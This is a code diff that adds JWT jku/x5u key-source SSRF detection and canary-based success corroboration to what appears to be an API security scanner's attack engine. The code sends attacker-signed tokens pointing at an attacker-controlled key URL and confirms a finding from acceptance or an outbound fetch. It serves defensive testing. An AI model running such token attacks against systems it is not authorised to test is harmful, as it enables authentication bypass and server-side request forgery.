+                f"acceptance (Requirement 45.2)."
+            )
+        else:
+            basis = (
+                f"Confirmed: an outbound request to the attacker-controlled key "
+                f"source referenced by the '{header_field}' header was observed "
+                f"(Requirement 45.3)."
+            )
+
+        evidence_lines: List[str] = [
+            f"jku/x5u key-source SSRF: the '{header_field}' header pointed at the "
+            f"attacker-controlled key source '{key_source_url}'.",
+            basis,
+            allowlist["evidence"],
+        ]
+
+        confidence = None
+        if assessment is not None:
+            evidence_lines.extend(assessment.evidence)
+            confidence = assessment.confidence_score
+
+        status_code = 0
+        response_size = 0
+        response_time = 0.0
+        if response_details is not None:
+            status_code = response_details.status_code
+            response_size = response_details.content_length
+            response_time = response_details.response_time
+            baseline_comparison = self._compare_with_baseline(response_details)
+            if baseline_comparison:
+                evidence_lines.append(
+                    "Baseline comparison: "
+                    f"status {baseline_comparison.get('baseline_status')} -> "
+                    f"{baseline_comparison.get('attack_status')} "
+                    f"(status_code_diff={baseline_comparison.get('status_code_diff')}, "
+                    f"content_length_diff={baseline_comparison.get('content_length_diff')}, "
+                    f"response_time_diff={baseline_comparison.get('response_time_diff')})"
+                )
+        if confidence is not None:
+            evidence_lines.append(f"Confidence score: {confidence}")
+
+        method = self._resolve_method()
+        token_preview = token[:50] + "..." if len(token) > 50 else token
+
+        return Finding(
+            id=str(uuid.uuid4()),
+            scan_id=scan_id,
+            category=JWT_JKU_SSRF_CATEGORY,
+            owasp_category=JWT_OWASP_CATEGORY,
+            severity=Severity.HIGH,
+            endpoint=self.target_url,
+            method=method,
+            status_code=status_code,
+            response_size=response_size,
+            response_time=response_time,
+            evidence="\n".join(evidence_lines),
+            recommendation=(
+                "Constrain JWT key sources to a strict allowlist of trusted "
+                "domains. Never fetch signature-verification keys from a "
+                "jku/x5u URL supplied in the token header, and reject tokens "
+                "whose key source is not on the allowlist."
+            ),
+            payload=token_preview,
+        )
+
+    async def test_key_source_ssrf(self, attacker_key_source_url: str,
+                                   key_source_observer=None,
+                                   scan_id: str = "") -> List[Finding]:
+        """Detect jku/x5u key-source SSRF (Requirement 45).
+
+        Builds a token referencing ``attacker_key_source_url`` in the ``jku`` and
+        then the ``x5u`` header, each signed with attacker-hosted keys (Req 45.1),
+        and issues it through the shared :class:`HTTPRequestEngine` honoring Safe
+        Mode (Req 45.4, consistent with Req 17). A finding is confirmed ONLY via
+        one of two gates:
+
+        * (a) the API accepts the attacker-signed token — detected through the
+          single success detector :class:`JWTAttackResponseAnalyzer` against the
+          established baseline (Req 45.2); OR
+        * (b) an outbound request to the attacker-controlled key source is
+          observed via the optional ``key_source_observer`` collaborator
+          (Req 45.3).
+
+        Neither mere submission of the token nor a failed key-source fetch is
+        ever treated as success. Each confirmed probe emits a ``JWT_JKU_SSRF``
+        finding (OWASP_Category API2); the acceptance path is a spoofed-key
+        acceptance that may equivalently be reported under ``JWT_JWKS_SPOOF``
+        (also API2). Every finding carries the key-source allowlist assessment as
+        evidence (Req 45.5).
+
+        Args:
+            attacker_key_source_url: The attacker-controlled jku/x5u key-source URL.
+            key_source_observer: Optional callable (sync or awaitable) taking the
+                key-source URL and returning whether the target issued an outbound
+                request to it (models an out-of-band interaction collaborator).
+            scan_id: The scan identifier stamped on each finding.
+
+        Returns:
+            The list of confirmed ``JWT_JKU_SSRF`` findings (possibly empty).
+        """
+        await self._establish_baseline()
+        method = self._resolve_method()
+        findings: List[Finding] = []
+
+        for header_field in ('jku', 'x5u'):
+            token = self._build_jku_x5u_token(header_field, attacker_key_source_url)
+
+            assessment: Optional[VulnerabilityAssessment] = None
+            response_details: Optional[ResponseDetails] = None
+            accepted = False
+            try:
+                response = await self._issue(token, method)
+            except Exception as e:
+                # A failed key-source fetch/probe maps to "not vulnerable / no
+                # outbound observed" rather than crashing the scan.
+                self.logger.debug("jku/x5u SSRF request failed",
+                                  header_field=header_field, error=str(e))
+                response = None
+
+            if response is not None:
+                response_details = self._to_response_details(response)
+                # JWTAttackResponseAnalyzer is the single success detector
+                # (Req 19.1); JWKS_SPOOF is the closest attack semantics.
+                assessment = self.response_analyzer.analyze_attack_response(
+                    response_details, AttackType.JWKS_SPOOF)
+                accepted = bool(assessment.is_vulnerable)
+
+            outbound_observed = await self._observe_key_source(
+                key_source_observer, attacker_key_source_url)
+
+            # Confirm ONLY via attacker-signed-token acceptance OR an observed
+            # outbound request; nothing else confirms a finding (Req 45.2/45.3).
+            if not (accepted or outbound_observed):
+                self.logger.info(
+                    "No jku/x5u SSRF confirmed for header field",
+                    header_field=header_field,
+                    key_source_url=attacker_key_source_url)
+                continue
+
+            allowlist = self._assess_key_source_allowlist(
+                header_field, attacker_key_source_url, accepted, outbound_observed)
+
+            self.logger.warning(
+                "jku/x5u key-source SSRF confirmed",
+                header_field=header_field,
+                key_source_url=attacker_key_source_url,
+                accepted=accepted,
+                outbound_observed=outbound_observed,
+                allowlisted=allowlist["allowlisted"])
+
+            findings.append(self._build_jku_ssrf_finding(
+                header_field=header_field,
+                key_source_url=attacker_key_source_url,
+                token=token,
+                accepted=accepted,
+                outbound_observed=outbound_observed,
+                assessment=assessment,
+                response_details=response_details,
+                allowlist=allowlist,
+                scan_id=scan_id,
+            ))
+
+        return findings
 
     # ------------------------------------------------------------------
     # HTTP execution through the shared engine (Requirement 17)
@@ -608,6 +1380,44 @@ class JWTAttackEngine:
         self.logger.info("Baseline established",
                          status_code=response_details.status_code)
 
+    def _attack_succeeded(self, assessment: Optional[VulnerabilityAssessment],
+                          response_body) -> bool:
+        """Decide whether an attack variant succeeded (Reqs 67.3-67.5).
+
+        The analyzer's ``is_vulnerable`` flag is the SOLE determinant of
+        success. An optional operator-supplied ``canary_value`` may only
+        CORROBORATE an already-successful result — it never promotes a
+        non-success into a success.
+
+        * Returns ``False`` when ``assessment`` is ``None`` or
+          ``assessment.is_vulnerable`` is ``False``. A canary match never turns
+          a non-success into a success (Req 67.4).
+        * Returns ``True`` when ``assessment.is_vulnerable`` is ``True``.
+          Additionally, when ``self.canary_value`` is set AND the canary appears
+          in ``response_body``, a corroborating evidence line is appended to
+          ``assessment.evidence`` exactly once (idempotent across repeated
+          calls) — Req 67.3.
+        * When no canary is supplied (``None``/empty), the return value is
+          exactly the analyzer result and no evidence is appended — existing
+          behavior is preserved (Req 67.5).
+
+        Guards against a ``None``/non-``str`` ``response_body``.
+        """
+        if assessment is None or not assessment.is_vulnerable:
+            return False
+
+        canary = self.canary_value
+        if canary and isinstance(response_body, str) and canary in response_body:
+            corroboration = (
+                f"Canary value '{canary}' present in response — "
+                "corroborates success."
+            )
+            # Append idempotently so repeated calls do not duplicate evidence.
+            if corroboration not in assessment.evidence:
+                assessment.evidence.append(corroboration)
+
+        return True
+
     async def execute_attack(self, attack_type: AttackType) -> Optional[AttackResult]:
         """Generate and execute a single attack vector.
 
@@ -654,7 +1464,9 @@ class JWTAttackEngine:
                 baseline_comparison=self._compare_with_baseline(response_details),
             )
 
-            if assessment.is_vulnerable:
+            if self._attack_succeeded(assessment, response_details.body):
+                # Analyzer flagged this variant as vulnerable; the canary (when
+                # supplied and present) has appended corroborating evidence.
                 break
 
         return result
